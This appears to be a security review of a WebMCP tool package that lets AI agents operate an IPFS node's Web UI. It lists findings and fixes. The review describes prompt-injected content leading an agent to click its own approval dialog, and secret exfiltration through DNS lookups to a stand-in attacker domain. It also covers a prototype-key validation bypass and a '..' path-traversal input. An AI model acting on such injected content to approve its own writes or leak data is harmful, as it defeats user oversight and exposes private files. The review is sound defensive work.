# R13 security review: WebMCP tool package and Web UI host

Date: 2026-10-12. Reviewer: security-reviewer (independent context, read-only; nothing was run). Recorded by the lead from the reviewer's hand-back.

Counts: CRITICAL 0, HIGH 2, MEDIUM 6, LOW 9, INFO 3.

## HIGH

- **H1. The agent can approve its own write.** The gate is page DOM the agent can operate: `WebMcpConfirmDialog.js:126` Approve has no `isTrusted`, arming delay or pointer-provenance check; requests stay pending 120 s (`confirmation-queue.js:7,45-60`) and Kimi passes no AbortSignal (REPORT.md). Scenario: injected content asks for `ipns_publish` of an attacker CID; the agent clicks Approve or runs `.click()`. Fix: treat the in-page gate as defeatable when the host can operate the page (say so in ADR-0002 and the toggle text); require `event.isTrusted` and `event.detail >= 1`; arm Approve after >=1 s visible plus a fresh pointerdown; shorter expiry without a signal; prefer a host-mediated interaction API if one exists; recommend writes off under browser-control or fully automatic modes.
- **H2. Exfiltration without confirmation through DNSLink.** `ipns_resolve` and `/ipns/<domain>` paths in read tools accept any domain (`generated/tools.ts:130,180,216,685,821`), and private reads (`mfs_read`, `mfs_ls`, `key_list`, `pin_ls`) need no confirmation. Untrusted content can ask the agent to read a secret and resolve `/ipns/<data>.x.attacker.example`, leaking it through the node's DNS lookups. Fix: put network name resolution (DNSLink names) behind its own off-by-default toggle or confirmation; allow only libp2p-key IPNS names freely; consider splitting private reads from network reads; document DHT lookups as a residual channel.

## MEDIUM

- **M1.** Double-click approves the next queued request unseen (`WebMcpConfirmDialog.js:31,96`). Arm Approve 750 ms-1 s per new request; ignore pointerdowns before render.
- **M2.** Unbounded queue, no deny-all, no rate limit (`confirmation-queue.js:57`). Cap pending (e.g. 3), decline extras, add "Deny all"/"Turn off agent writes", rate-limit writes.
- **M3.** Prototype-key bypass in the schema validator (`src/schema.ts:67-70`): `__proto__` sets `out`'s prototype, so unvalidated `hash`, `filename`, `cid_version`, `ttl`, `size`, `name` reach executors and the dialog does not show them. Fix with `Object.hasOwn`, `Object.create(null)` or rejecting `__proto__`/`constructor`/`prototype`; same in `dagjson.ts:15,35`; negative tests.
- **M4.** Dialog spoofing with agent-supplied text: `confirm.ts` passes path, source, destination, filename, name, key unsanitized; `CONTROL` misses U+200B-U+200F, U+061C, U+FEFF, U+00AD; long values push buttons below the fold. Fix: strict sanitizer rendering bidi/invisible code points visibly, middle-truncation with "show full", visual quoting, anchored path patterns.
- **M5.** Registrations can outlive a toggle and `execute()` never checks live settings (`register.ts:41`, `tools.ts:78-128`, `confirmation-queue.js:45`). Fix: live `isActive()`/generation check in `execute`; `requestConfirmation` declines when writes are off; spike criterion for unregistration.
- **M6.** Contract egress control (`contentEgress`/`egress_ack`) is not carried into WebMCP; Files contents, listen addresses and peer IPs go to the agent's AI provider after one generic toggle. Fix: say so in the toggle text; gate content-egress and diagnostic tools behind an explicit acknowledgement or redact IPs by default.

## LOW

- **L1.** Dialog omits decision facts: `ipfs_add` recipe overrides, `key_gen` RSA size, `car_import` roots (parsed only after approval), `ipns_publish` replacing the record and `self` being the node identity, content shown only as 160 characters.
- **L2.** `..` segments bypass the MFS "no /ipfs/, /ipns/" rule (`mfs_stat {"/a/../ipns/x.example"}` resolves through DNSLink via `checkPath`); the Go server probably shares this (unverified). Reject `.`/`..` segments.
- **L3.** Settings in `localStorage` are writable by same-origin content when the fork is served from a path gateway origin. Do not persist `writes`, or re-acknowledge per load.
- **L4.** RPC error text from third parties goes to the agent unmarked and unredacted.
- **L5.** Network multiaddrs returned as trusted results; mark untrusted (contract change).
- **L6.** Vendor integrity is self-referential: no source commit or dist hash, `--check` not in CI.
- **L7.** `exposed` derivation is a deny-list; use an allow-list and throw on unknown classes.
- **L8.** `car_export` up to 256 MiB and an unbounded cursor without confirmation; lower limits.
- **L9.** `dagjson.ts` `__proto__` handling (with M3).

## INFO

- **I1.** `Permissions-Policy: tools=()` feature token unverified against the draft; point operators at `API.HTTPHeaders`.
- **I2.** No framing-header guidance for the Web UI; confirm Kubo API headers.
- **I3.** Blocks fetched by read tools may be announced under the default `Provide.Strategy`; document next to the toggle.

## Verified safe (by reading)

- All 5 destructive tools excluded by class; `confirm_token` stripped.
- Writes need the hook to return exactly `true`; throw, expiry, Escape, abort and toggle-off decline; no hook means no write tools.
- Off by default and fails closed; cleanup unregisters and denies pending requests.
- No hardcoded endpoints; untrusted output separated under `data`; no XSS, eval or shell; byte caps after decoding; exact pins, lockfile integrity, no new Web UI dependency.

## Manual follow-ups

1. Test whether each host's agent can click Approve (CDP click and script `.click()`).
2. Confirm whether each host honors the registration AbortSignal.
3. Live check that `mfs_stat "/a/../ipns/<domain>"` triggers DNSLink.
4. Whether hosts pass arguments with an own `__proto__`.
5. Confirm the Permissions-Policy token.
6. Kubo API framing headers.
